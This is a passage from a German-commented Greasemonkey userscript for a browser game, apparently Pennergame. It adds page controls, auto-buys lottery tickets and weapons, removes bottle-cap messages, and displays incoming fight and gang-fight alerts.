                            insElem(newtd2, anlegbar, plundertrs, i, "A", plunderinfo, anlegtd);
                        }
                    }
                    // Referenz auf Plundertabelle speichern
                    var plundertable = document.getElementById("plunder").getElementsByTagName("table");
                    if (plundertable.length > 0) {
                        plundertable = plundertable[0];
                        // Referenz auf Zeilen der Plundertabelle speichern
                        var plundertrs = plundertable.getElementsByTagName("tr");
                        if (plundertrs.length > 0)
                            insPlunderChb(plundertrs);
                    }
                    if (!oldVersion) {
                        var PlunderChbTO = function() {
                            var plundertable = document.getElementById("plunder").getElementsByTagName("table");
                            if (plundertable.length > 0) {
                                plundertable = plundertable[0];
                                // Referenz auf Zeilen der Plundertabelle speichern
                                var plundertrs = plundertable.getElementsByTagName("tr");
                                if (plundertrs.length > 0 && document.getElementsByName("PlunderCheckbox").length == 0)
                                    insPlunderChb(plundertrs);
                            }
                            window.setTimeout(PlunderChbTO, 2000);
                        }
                        window.setTimeout(PlunderChbTO, 2000);
                    }
                }
                fnPlunderChB();
            }

            // **********************************************************************************
            // Wenn die aktuelle Seite die Bastelseite ist
            // **********************************************************************************
            if (IsCraftPage()) {
                var tables = document.getElementsByTagName("table");
                // **********************************************************************************
                // *** GM_XMLHTTPREQUEST *** Plunderseite abfragen
                // **********************************************************************************
                GM_xmlhttpRequest({method:"GET", url: PLUNDER_URL, onload:function(responseDetails) {
                    var content = responseDetails.responseText;
                    var aktPlunder = trimString(PGu_getValue("LastPlunderName", ""));
                    for (var i = 0; i < tables.length; i++) {
                        var tname = tables[i].id;
                        if (tname.substr(0,12) != "messageslist")
                            continue;
                        tabnr = tname.substr(12);
                        if (tabnr < 3)
                            continue;
                        var td = tables[i].getElementsByTagName("tr")[1].getElementsByTagName("td")[2];
                        var prefix = td.innerHTML.split(">")[0] + ">";
                        var text = td.innerHTML.substr(prefix.length).split("</p>")[0];
                        var text2 = text;
                        var plunderlist = text.split("<br>");
                        for (j = 0; j < plunderlist.length; j++) {
                            var plunder = plunderlist[j];
                            var p = plunder.indexOf("x ");
                            var pname = trimString(plunder.substr(p+2));
                            var pInd = content.search('"> *' + pname + ' *<');
                            var pAnz = 0;
                            if (pInd != -1)
                                pAnz = content.substr(pInd).split('"col3">')[1].split(" ")[0];
                            if (aktPlunder == pname)
                                pAnz++;
                            text2 = text2.replace(pname, pname + " (" + pAnz + ")");
                        }
                        td.innerHTML = td.innerHTML.replace(text, text2);
                    }
                }});
            }

            // **********************************************************************************
            // Wenn die aktuelle Seite die Loseseite ist
            // **********************************************************************************
            if (IsGamePage()) {
                function Losekaufen(menge, maxMenge)
                {
                    if (menge <= 0) {
                        document.getElementsByName('submitForm')[0].disabled = false;
                        document.getElementById('NochLose').innerHTML = printf(getLangTxt(TxtReload), 5);
                        setInterval("window.location.reload();", 5000);
                        return;
                    }

                    document.getElementById('NochLose').innerHTML = printf(getLangTxt(TxtBuyTickets), menge);
                    var bmenge = menge;
                    if (bmenge > maxMenge)
                        bmenge = maxMenge;

                    document.getElementById('menge1').value = bmenge;
                    unsafeWindow.generatePreis(1,10);

                    var data = "";
                    var input = document.getElementById('content').getElementsByClassName('listshop')[0].getElementsByTagName('td')[4].getElementsByTagName("input");
                    for (i = 0; i < input.length; i++)
                        if (input[i].name != "max")
                            data += input[i].name + "=" + (input[i].name == "menge"?bmenge:input[i].value) + "&";
                    GM_xmlhttpRequest({method: 'POST',
                                       url: 'http://'+window.location.hostname+'/city/games/buy/',
                                       headers: {'Content-type': 'application/x-www-form-urlencoded'},
                                       data: encodeURI(data.substr(0,data.length-1)),
                                       onload: function(responseDetails) {
                                                   var content = responseDetails.responseText;
                                                   var spl = content.split('icon money">');
                                                   if (spl.length > 1) {
                                                       var money = document.getElementsByClassName("icon money");
                                                       money2 = spl[1].split("</a>")[0].split(">");
                                                       money[0].innerHTML = money2[0]+">"+money2[1]+"</a>";
                                                       menge = menge - bmenge;
                                                   }
                                                   Losekaufen(menge, maxMenge);
                                               }
                                      });
                }

                function getAnzLose() {
                    var tds = document.getElementsByTagName('table')[0].getElementsByTagName('tr')[1].getElementsByTagName('td');
                    var texts = tds[0].innerHTML.split('<b>')[1].split(' ');
                    var NochLose = 0;
                    for (i = 0; i < texts.length; i++)
                        if (!isNaN(texts[i])) {
                            NochLose = Number(texts[i]);
                            break;
                        }
                    return NochLose;
                }

                var text = document.getElementById('submitForm1').value;
                var NochLose = getAnzLose();

                var tdlose = document.getElementById('content').getElementsByClassName('listshop')[0].getElementsByTagName('td');
                tdlose[3].id = "NochLose";
                var input = document.createElement('input');
                input.type = 'button';
                input.value = getLangTxt(Txtmax);
                input.id = 'max';
                input.name = 'max';
                tdlose[4].appendChild(input, tdlose[4].firstChild);
                document.getElementById('submitForm1').disabled = (NochLose == 0);

                document.getElementsByName('menge')[0].parentNode.innerHTML = document.getElementsByName('menge')[0].parentNode.innerHTML.replace("1,1","1,10");
                document.getElementsByName('menge')[0].addEventListener('keyup', function onkeyup() {
                    var testmenge = document.getElementsByName('menge')[0].value;
                    var NochLose = getAnzLose();
                    if (Number(testmenge) > NochLose) {
                        document.getElementById('menge1').value = NochLose;
                        if (NochLose > 0) {
                            unsafeWindow.generatePreis(1,10);
                        }
                    };
                },false);

                document.getElementsByName('max')[0].addEventListener('click', function start() {
                    var NochLose = getAnzLose();
                    document.getElementById('menge1').value = NochLose;
                    if (NochLose > 0) {
                        unsafeWindow.generatePreis(1,10);
                    }
                    else
                        document.getElementById('submitForm1').disabled = true;
                },false);

                document.getElementById('submitForm1').type = "button";
                document.getElementById('submitForm1').addEventListener('click', function start() {
                    var menge = Number(document.getElementById('menge1').value);
                    document.getElementsByName('submitForm')[0].disabled = true;
                    Losekaufen(menge, 10);
                },false);
            }

            // **********************************************************************************
            // Wenn die aktuelle Seite die V-Waffenseite ist
            // **********************************************************************************
            if (IsDefWeaponPage()) {
                var tdkopf = document.getElementById('content').getElementsByClassName('listshop')[0].getElementsByTagName('td');
                tdkopf[0].innerHTML += "<br>";
                var newspan = document.createElement('span');
                newspan.innerHTML = "<span>&nbsp;"+getLangTxt(TxtBuyLastDefWpn)+"</span>";
                var input = document.createElement('input');
                input.type = 'checkbox';
                input.checked = PGu_getValue("rebuyLastDefWpn", false);
                input.id = 'rebuy';
                input.name = 'rebuy';
                newspan.insertBefore(input, newspan.firstChild);
                tdkopf[0].appendChild(newspan);
                var newtd = document.createElement('td');
                newtd.innerHTML = "<td>&nbsp;"+getLangTxt(TxtRmdDefWpn)+": </td>";
                var input = document.createElement('input');
                input.type = 'checkbox';
                input.id = 'remind';
                input.name = 'remind';
                newtd.insertBefore(input, newtd.firstChild);
                input = document.createElement('input');
                input.type = 'text';
                input.size = 3;
                input.id = 'remindcnt';
                input.name = 'remindcnt';
                newtd.appendChild(input);
                newtd.innerHTML += "&nbsp;&nbsp;&nbsp;";
                input = document.createElement('input');
                input.type = 'checkbox';
                input.id = 'woconf';
                input.name = 'woconf';
                newtd.appendChild(input);
                newtd.innerHTML += "&nbsp;&nbsp;" + getLangTxt(TxtNoConfirm);
                tdkopf[0].appendChild(newtd);
                document.getElementById("remind").checked = PGu_getValue("remindDefWpn", false);
                document.getElementById("remindcnt").value = PGu_getValue("remindDefWpnMax", 3);
                document.getElementById("woconf").checked = PGu_getValue("woConfDefWpn", false);

                document.getElementById('rebuy').addEventListener('click', function onClick() {
                    var checkVal = document.getElementById('rebuy').checked;
                    PGu_setValue("rebuyLastDefWpn", checkVal);
                    PGu_setValue("remindDefWpnCnt", 0);
                },false);

                document.getElementById('remind').addEventListener('click', function onClick() {
                    var checkVal = document.getElementById('remind').checked;
                    PGu_setValue("remindDefWpn", checkVal);
                    if (checkVal) {
                        var cnt = document.getElementById('remindcnt').value;
                        PGu_setValue("remindDefWpnMax", cnt);
                        PGu_setValue("remindDefWpnCnt", 0);
                    }
                },false);

                document.getElementById('remindcnt').addEventListener('change', function onChange() {
                    var cnt = document.getElementById('remindcnt').value;
                    PGu_setValue("remindDefWpnMax", cnt);
                },false);

                document.getElementById('woconf').addEventListener('click', function onClick() {
                    var checkVal = document.getElementById('woconf').checked;
                    PGu_setValue("woConfDefWpn", checkVal);
                },false);
            }

            // **********************************************************************************
            // Wenn die aktuelle Seite die Nachrichtenseite ist
            // **********************************************************************************
            if (IsMessagesPage() && lang == 0) {
                var tdkopf = document.getElementById('messageslist').getElementsByTagName("tr");
                var newtr = document.createElement('tr');
                var newtd = document.createElement('td');
                newtd.innerHTML = '<td>&nbsp;'+getLangTxt(TxtDeactKKMsg)+'</td>';
                var input = document.createElement('input');
                input.type = 'checkbox';
                input.id = 'deactKK';
                input.name = 'deactKK';
                newtd.setAttribute('colspan', 3);
                newtd.insertBefore(input, newtd.firstChild);
                newtr.appendChild(newtd);
                tdkopf[0].parentNode.insertBefore(newtr, tdkopf[0]);
                document.getElementById("deactKK").checked = PGu_getValue("deactKKMsgs", false);

                document.getElementById('deactKK').addEventListener('click', function onClick() {
                    var checkVal = document.getElementById('deactKK').checked;
                    PGu_setValue("deactKKMsgs", checkVal);
                },false);

            }

            // **********************************************************************************
            // Kronkorken-Nachrichten deaktivieren und entfernen
            // **********************************************************************************
            if (PGu_getValue("deactKKMsgs", false)) {
                function deactAndRemove(content) {
                    var pos = content.search(/\d+\sKronkorken/);
                    if (pos == -1)
                        return;
                    pos = content.substr(pos-200).indexOf('<a href=') + pos - 200;
                    var href = content.substr(pos).split('"')[1];
                    GM_xmlhttpRequest({method: 'GET', url: TOWNBASE_URL + href + "?mail_block=true", onload: function(responseDetails) {
                        GM_xmlhttpRequest({method: 'GET', url: TOWNBASE_URL + href.replace('read', 'delete'), onload: function(responseDetails) {
                        }});
                    }});
                }
                if (IsMessagesPage()) {
                    content = document.getElementById("messageslist").innerHTML;
                    deactAndRemove(content);
                }
                else {
                    GM_xmlhttpRequest({method: 'GET', url: MESSAGE_URL, onload: function(responseDetails) {
                        var content = responseDetails.responseText;
                        deactAndRemove(content);
                    }
                });
                }
            }

            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** Abfragen, ob es einen eingehenden KAMPF gibt
            // **********************************************************************************
            GM_xmlhttpRequest({method: 'GET', url: FIGHT_URL, onload: function(responseDetails) {
                    // ***********************************************************************************************
                    // ***********************************************************************************************
                    // Array nach Zeit sortieren
                    // ***********************************************************************************************
                    // ***********************************************************************************************
                    function sortByTime(a, b) {

                        // ***********************************************************************************************
                        // Funktion addiert auf Stunden des Folgetags 24 Stunden, damit die Sortierreihenfolge passt
                        // ***********************************************************************************************
                        function ReformatHours(nowtime, a) {
                            // Wenn die Jetztzeit kleiner (früher) ist als die übergebene Zeit ist
                            if (nowtime <= a) {
                                return a;
                            // sonst: Die Jetztzeit ist größer (später) als die übergebene Zeit --> Datumsgrenze
                            } else {
                                // 24 Stunden addieren, damit das Datum nach hinten sortiert wird (Folgetag)
                                return (Number(a.substr(0, 2)) + 24).toString() + a.substr(2, 6);
                            }
                        }

                        if (a == "" || b == "")
                            return (a != "")?-1:(b != "")?1:0;

                        var jetzt = new Date();
                        var nowtime = Right$(jetzt.toLocaleString(), 8);

                        var x = ReformatHours(nowtime, a.substr(0,8));
                        var y = ReformatHours(nowtime, b.substr(0,8));

                        return ((x < y) ? (-1) : ((x > y) ? 1 : 0));
                    }
                    var ckw = function() {
                        if (weaponatt > 1) {
                            weaponatt = 0;
                            PGu_setValue("weapon", weapondef);
                            GM_xmlhttpRequest({method: 'POST', url: WEAPONSTORE_URL + "buy/",
                                headers: {'Content-type': 'application/x-www-form-urlencoded'},
                                data: encodeURI('id=1'),
                                onload: function(responseDetails)	{
                                }});
                        }
                        else if (weaponatt = -1)
                            setTimeout(ckw, 1000);
                    }

                    var content = responseDetails.responseText;

                    // Wenn die Kampfseite abgerufen werden konnte (kein Seitenladefehler)
                    if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                        if (content.indexOf(TxtRunAttack[lang]) != -1) {
                            attname = trimString(content.split(TxtRunAttack[lang])[1].split('</a>')[0].split('>').pop());
                            attid = content.split(TxtRunAttack[lang])[1].split('profil/id:')[1].split('/')[0];
                            if (bl("fi"))
                               if (weaponatt > 1)
                                   ckw();
                               else if (weaponatt == -1)
                                   setTimeout(ckw, 5000);
                            // ***********************************************************************************************
                            // Abrufen des XML-Datensatzes für den angegriffenen User
                            // ***********************************************************************************************
                            GM_xmlhttpRequest({method: 'GET', url: API_URL + attid + ".xml", onload: function(responseDetails) {
                                // Wenn die Seite erfolgreich abgerufen werden konnte
                                if (responseDetails.status == 200) {
                                	var parser = new DOMParser();
                                    var dom = parser.parseFromString(responseDetails.responseText, "application/xml");
                                    gangname = dom.getElementsByTagName('name')[1].textContent;
                                    if (gangname.toLowerCase() != 'false') {
                                        attname += "/" + dom.getElementsByTagName('name')[1].textContent;
                                        var gangid = dom.getElementsByTagName('id')[1].textContent;
                                        if (m_owngangid == gangid)
                                            attwarn = 1;
                                        else if (m_owngangid != 0)
                                            // **********************************************************************************
                                            // *** GM_XMLHTTPREQUEST *** Bandenbündnisse laden
                                            // **********************************************************************************
                                            GM_xmlhttpRequest({method: 'GET', url: GANGPACT_URL, onload: function(responseDetails) {
                                                var profcontent = responseDetails.responseText;

                                                // Wenn die Kampfseite abgerufen werden konnte (kein Seitenladefehler)
                                                if (profcontent.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                                                    var allies = profcontent.split('#222222')[2];
                                                    var allypos = allies.indexOf('<td>'+gangname+'</td>');
                                                    if (allypos != -1) {
                                                        var divPos = allies.substr(allypos).indexOf('</div>');
                                                        if (allies.substr(allypos, divPos).indexOf("bstyle0") != -1)
                                                            attwarn = 2;
                                                        }
                                                }
                                            }});
                                    }
                                }
                            }});
                        }
                        else {
                            weapon = PGu_getValue("weapon", 0) + "#";
                            weapon = weapon.split("#");
                            if (weapon[0] > 0) {
                                GM_xmlhttpRequest({method: 'POST', url: WEAPON_URL + "use/",
                                    headers: {'Content-type': 'application/x-www-form-urlencoded'},
                                    data: encodeURI('id='+weapon[0]),
                                    onload: function(responseDetails)	{
                                        PGu_setValue("weapon", 0);
                                    }});
                            }
                        }

                        // Überprüfe aktuelle Kampfwerte auf maximale Kampfstärke
                        CheckFightValues(content);

                        // Daten eingehender Kämpfe ermitteln
                        var ftext = GetNumberOfFights(content);

                        // Wenn es eingehende Kämpfe gibt
                        if (ftext != "") {
                            var IncomingFights = ftext.split('/').slice(0, -1);
                            var NrOfFights = IncomingFights.length;
                            // Wenn mehr als ein Kampf eingeht
                            if (NrOfFights > 1) {
                                var FightTitle = printf(getLangTxt(TxtIncomingFights2), NrOfFights);
                            // sonst: Es gibt nur einen eingehenden Kampf
                            } else {
                                var FightTitle = getLangTxt(TxtIncomingFights1);
                            }

                            // Wenn weniger als 6 Angriffe eingehen
                            if (NrOfFights < 6) {
                                var FightIcon = NrOfFights;
                            // sonst: Es gehen 6 oder mehr Angriffe ein
                            } else {
                                var FightIcon = 6;
                            }

                            FightTitle = '<tr><td style="font-size:12px"><b>' + FightTitle + "</b></td></tr>";
                            IncomingFights.sort(sortByTime);
                            for (var i = 0; i < NrOfFights; i++) {
                                var splitted = IncomingFights[i].split('#');
                                var ausweich = printf(getLangTxt(TxtAusweichen), (splitted[1] == 'N'?getLangTxt(TxtAusweichN):splitted[1] == 'V'?getLangTxt(TxtAusweichV):''));
                                if (splitted[1][0] == "A")
                                    ausweich += " (-" + splitted[1].split(':')[1] + ")";
                                FightTitle += '<tr><td>' + splitted[0] + '</td><td>&nbsp;</td><td>' + ausweich + '</td></tr>';
                                }

                            // Kampf-Icon anzeigen
                            ShowFightIcon(FightIcon, FightTitle);
                        }
                        else
                            ShowImg('FBBACK', '/fight/', ICON_FIGHT[0], '', '', '', 0, 14, 1, 'fight');
                    // sonst: Die Kampfseite konnte nicht abgerufen werden
                    } else {
                        // Fehler in Wut-Anzeige darstellen
                        ShowWutIcon(WUTSTATE_ERROR);
                        // Fehler in Power-Anzeige darstellen
                        ShowFightStateIcon(FIGHTSTATE_ERROR, 0, 0);
                        noUpdate = true;
                    }
                }
            });

            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** Abfragen, ob es einen BANDENKAMPF gibt
            // **********************************************************************************
            GM_xmlhttpRequest({method:"GET", url: GANGFIGHT_URL, onload:function(responseDetails) {
                    var content = responseDetails.responseText;

                    // Anzahl Bandenkämpfe ermitteln
                    var NrOfGangFights = GetNumberOfGangFights(content);

                    // Wenn es laufende Bandenkämpfe gibt
                    if(NrOfGangFights > 0) {
                        // Bandenkampfinfo abfragen
                        var GangFightInfo = GetGangFightInfo(content);

                        // Wenn es mehr als einen Bandenkampf gibt
                        if (NrOfGangFights > 1) {
                            var GangFightTitle = printf(getLangTxt(TxtGangFight2), NrOfGangFights, GangFightInfo);
                        // sonst: Es gibt nur einen eingehenden Kampf
                        } else {
                            var GangFightTitle = printf(getLangTxt(TxtGangFight1), GangFightInfo);
                        }
                        // Wenn es weniger als 6 Bandenkämpfe gibt
                        if (NrOfGangFights < 6) {
                            var GangFightIcon = NrOfGangFights;
                        // sonst: Es gibt 6 oder mehr Bandenkämpfe
                        } else {
                            var GangFightIcon = 6;
                        }

                        // Bandenkampf-Icon anzeigen
                        ShowGangFightIcon(GangFightIcon, GangFightTitle);

                        // Wenn die aktuelle Seite die Bandenkampfseite ist
                        if (IsFightOverviewPage()) {
                            // Setze den Neuigkeitenanzeiger zurück
                            ResetNewsFromGangFight(GangFightInfo);
                        // sonst: Die aktuelle ist nicht die Bandenkampfseite
                        } else {
                            // Überprüfe, ob sich bei den Bandenkämpfen Neuigkeiten ergeben haben
                            CheckNewsFromGangFight(GangFightInfo);
                        }

                        // Wenn es Neuigkeiten beim Bandenkampf gibt
                        if (PGu_getValue("GangFightInfoFlag", true)) {
                            ShowNewIcon();
                        }
                    }
                    else
                        ShowImg('GFBACK', '/gang/fight/', ICON_GANGFIGHT[0], '', '', '', 0, 14, 1, 'gangfight');
                }
            });
        }
    });
}

// ********************************************************************************************************************
// ********************************************************************************************************************
// ********************************************************************************************************************
// START PROGRAMM * START PROGRAMM * START PROGRAMM * START PROGRAMM * START PROGRAMM *START PROGRAMM *START PROGRAMM *
// ********************************************************************************************************************
// ********************************************************************************************************************
// ********************************************************************************************************************

var waitAndStart = function() {
    if (wrap == null) {
        wrap = document.getElementById("wrap");
        if (wrap == null) {
            setTimout(waitAndStart, 500);
            return;
        }
    }

    // Aktuellen Geldstand ermitteln
    GetMoney(document);

    ByeByeGoogle();

    for (i = 0; i < 9; i++)
        glblVars[i] = 0;
    glblVars[9] = "";
    glblVars[10] = "";

    if (!bl())
        doTheAction();
}

// ***********************************************************************************************
// Auf eine neue Version des Skriptes prüfen
// ***********************************************************************************************
CheckForUpdate(GM_getValue("GetUpdate", 0));

// ***********************************************************************************************
// Auf neue Infos prüfen
// ***********************************************************************************************
CheckForInfos(GM_getValue(TOWNEXTENSION+"GetInfo", 0));

waitAndStart();

